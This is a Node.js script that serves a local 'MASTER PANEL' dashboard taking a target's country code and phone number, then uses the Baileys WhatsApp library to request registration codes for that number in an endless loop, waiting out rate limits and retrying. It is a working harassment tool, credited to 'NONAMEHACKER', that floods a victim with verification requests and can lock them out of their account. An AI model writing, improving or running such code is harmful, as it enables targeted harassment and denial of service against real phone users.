const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const http = require('http'); // Native Node.js module, no installation needed

// Setup
if (!fs.existsSync('./files')) fs.mkdirSync('./files');
if (!fs.existsSync('./files/numbers.json')) fs.writeFileSync('./files/numbers.json', JSON.stringify({}));

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#FF0000', '#800000'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#FF0000', '#800000'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#FF0000', '#800000'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#FF0000', '#800000'])}
`;

const spiderArt = `
    ${color('          _xxxx_          ', ['#FF0000', '#200000'])}
    ${color('        /        \\        ', ['#FF0000', '#200000'])}
    ${color('      /            \\      ', ['#FF0000', '#200000'])}
    ${color('     |   _      _   |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |  (o)    (o)  |     ', ['#FF0000', '#FFFFFF'])}
    ${color('     |      __      |     ', ['#FF0000', '#200000'])}
    ${color('      \\    \\__/    /      ', ['#FF0000', '#200000'])}
    ${color('        \\________/        ', ['#FF0000', '#200000'])}
    ${color('      _ /        \\ _      ', ['#FF0000', '#200000'])}
    ${color('     /              \\     ', ['#FF0000', '#200000'])}
`;

// Embedded HTML Dashboard
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MASTER Panel Dashboard</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #ff0000;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #111;
            padding: 30px;
            border: 2px solid #800000;
            border-radius: 10px;
            box-shadow: 0 0 15px #ff0000;
            text-align: center;
            width: 350px;
        }
        h2 {
            margin-top: 0;
            text-shadow: 0 0 5px #ff0000;
        }
        input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            background-color: #222;
            border: 1px solid #ff0000;
            color: #fff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #800000;
            color: #fff;
            border: none;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            transition: 0.3s;
        }
        button:hover {
            background-color: #ff0000;
        }
        #status {
            margin-top: 15px;
            color: #00ff00;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>👑 MASTER PANEL 👑</h2>
        <form id="targetForm">
            <input type="text" id="ddi" placeholder="Country Code (e.g., 92)" required>
            <input type="text" id="number" placeholder="Phone Number" required>
            <button type="submit">Deploy Target</button>
        </form>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('targetForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const ddi = document.getElementById('ddi').value.trim();
            const number = document.getElementById('number').value.trim();
            const statusDiv = document.getElementById('status');
            
            statusDiv.textContent = "Deploying...";
            statusDiv.style.color = "#ffff00";

            try {
                const response = await fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ddi, number })
                });

                const result = await response.json();
                statusDiv.textContent = result.message;
                statusDiv.style.color = "#00ff00";
            } catch (error) {
                statusDiv.textContent = "Failed to connect to backend.";
                statusDiv.style.color = "#ff0000";
            }
        });
    </script>
</body>
</html>
`;

const start = async () => {
    console.clear(); 

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;

    exec(openCmd);

    console.log(masterBanner);
    console.log(spiderArt);
    console.log(color('╔════════════════════════════════════════════╗', ['#FF0000', '#4B0082']));
    console.log(color('║       👑 OWNER: NONAMEHACKER 👑            ║', ['#FFFFFF', '#FF0000']));
    console.log(color('║       🛡️ TEAM : Ｍ▲ＳＴΞЯ...               ║', ['#00FFFF', '#0000FF']));
    console.log(color('╚════════════════════════════════════════════╝', ['#FF0000', '#4B0082']));

    const { state } = await useMultiFileAuthState('.auth_session');

    const spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const dropNumber = async (context) => {
        const { ddi, number, phoneNumber } = context;
        while (true) {
            try {
                console.clear();
                console.log(masterBanner);
                console.log(spiderArt);
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
                console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
                console.log(color(`  [+] TARGET NUMBER : +${ddi}${number} `, ['#FF0000', '#FFFFFF']));
                console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));

                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                if (res.reason === 'temporarily_unavailable') {
                    console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                    await new Promise(r => setTimeout(r, res.retry_after * 1000));
                }
            } catch (e) {
                // Background retry logic exactly as before
            }
        }
    };

    // Spin up a lightweight web server directly in Node.js
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/') {
            // Serve the dashboard HTML
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(dashboardHTML);
        } else if (req.method === 'POST' && req.url === '/start') {
            // Handle incoming target data from the dashboard
            let body = '';
            req.on('data', chunk => body += chunk.toString());
            req.on('end', () => {
                const data = JSON.parse(body);
                
                // Fire off the attack loop asynchronously
                dropNumber({ 
                    ddi: data.ddi, 
                    number: data.number, 
                    phoneNumber: data.ddi + data.number 
                });
                
                // Respond back to the frontend immediately
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} locked. Check terminal.` }));
            });
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(3000, () => {
        console.log(color('\n ► SERVER RUNNING! Open http://localhost:3000 in your browser to enter numbers.', ['#00FF00', '#FFFFFF']));
    });
};

start();

